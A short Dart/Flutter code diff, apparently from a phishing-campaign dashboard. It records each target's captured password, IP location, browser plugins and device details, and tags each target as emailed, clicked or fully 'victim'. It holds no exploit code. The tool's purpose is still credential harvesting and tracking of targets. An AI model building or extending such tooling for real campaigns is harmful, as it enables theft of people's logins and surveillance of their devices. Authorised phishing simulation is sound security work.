@@ -210,21 +210,29 @@ class _HomePageState extends State<HomePage> {
                           // Get the victim
                           Victim vic = attack.getVictim(v["victimIdent"] as int);
 
-                          if (v["password"] != null) {
-                            vic.setPassword(v["password"] as String);
-                          }
+                          VictimState state = VictimState.emailed;
 
                           if (v["Ip"] != null) {
                             vic.setIpDetails(IpDetails(v["Ip"] as String, v["Country"] as String, v["City"] as String));
+                            state = VictimState.clicked;
                           }
 
                           if (v["BrowserPlugins"] != null) {
                             vic.setBrowserPlugins(v["BrowserPlugins"] as String);
+                            state = VictimState.clicked;
                           }
 
                           if (v["DeviceDetails"] != null) {
                             vic.setDeviceDetails(v["DeviceDetails"] as String);
+                            state = VictimState.clicked;
                           }
+
+                          if (v["password"] != null) {
+                            vic.setPassword(v["password"] as String);
+                            state = VictimState.victim;
+                          }
+
+                          vic.setState(state);
                         }
                       }
 
